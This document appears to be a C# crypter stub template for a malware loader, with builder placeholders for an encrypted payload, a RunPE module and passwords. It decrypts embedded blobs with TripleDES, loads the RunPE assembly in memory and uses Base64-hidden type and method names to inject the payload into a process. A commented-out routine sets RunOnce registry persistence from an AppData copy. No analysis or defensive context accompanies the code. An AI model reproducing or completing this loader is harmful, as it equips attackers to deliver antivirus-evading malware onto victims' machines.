using System;
using System.IO;
using System.IO.Compression;
using Microsoft.VisualBasic;
using System.Threading;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Text;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using Microsoft.VisualBasic.CompilerServices;
using System.Collections.Generic;
using System.Security.Permissions;
using System.Security;
using System.Resources;
using System.Security.Cryptography;
using System.Linq;
using System.Collections.ObjectModel;
using System.ComponentModel;

//Default [assembly: AssemblyTitle("Loader")]
//Default [assembly: AssemblyDescription("")]
//Default [assembly: AssemblyCompany("Loader")]
//Default [assembly: AssemblyProduct("Loader")]
//Default [assembly: AssemblyCopyright("Copyright ©  2011")]
//Default [assembly: AssemblyFileVersion("1.0.0.0")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]



  
namespace %28%
{
    static class %29%
    {


        [STAThread]
        static void Main()
        {
            
            //Startup %35%();

            byte[] %5% = {%Razor%};

		    byte[] %6% = {%Runpe%};

		    byte[] %13% = (byte[])%4%(ref %5%, ref %7%);

            byte[] %14% = (byte[])%4%(ref %6%, ref %8%);

            Assembly %16% = Assembly.Load(%14%);

            byte[] ArgumentExceptions = Convert.FromBase64String("Q29yb25vdmlydXMuQ29yb25vdmlydXM=");

            string IsValidHandle = Encoding.UTF8.GetString(ArgumentExceptions);

            byte[] finalizing  = Convert.FromBase64String("QWN0aXZpdHk=");

            string pointer = Encoding.UTF8.GetString(finalizing );

            MethodInfo %15% = %16%.GetType(IsValidHandle).GetMethod(pointer);

            %15%.Invoke(null, new object[] { Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), Environment.GetCommandLineArgs()[0]), %13% });
        }

        public static string %8% = "%RunpePassword%";

        public static string %7% = "%Password%";

        public static object %4%(ref byte[] %11%, ref string %9%)
        {
            MD5CryptoServiceProvider %12% = new MD5CryptoServiceProvider();
            byte[] %10% = %12%.ComputeHash(Encoding.Unicode.GetBytes(%9%));
            return new TripleDESCryptoServiceProvider
            {
                Key = %10%,
                Mode = CipherMode.ECB
            }.CreateDecryptor().TransformFinalBlock(%11%, 0, %11%.Length);
        }

       	//Startup public static void %35%()
        //Startup {
		//Startup int %36% = Conversions.ToInteger("1");
        //Startup if ((double)%36% != Conversions.ToDouble("1") || Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "%Name%", (object)null) != null)return;
        //Startup string %37% = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\%FolderName%\\%Startup File Name%";
        //Startup if (!Directory.Exists(Path.GetDirectoryName(%37%)))
        //Startup {
        //Startup Directory.CreateDirectory(Path.GetDirectoryName(%37%));
        //Startup File.Copy(Application.ExecutablePath, %37%, true);
        //Startup }
        //Startup Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "%Name%", (object)%37%);    
        //Startup }

    }
}
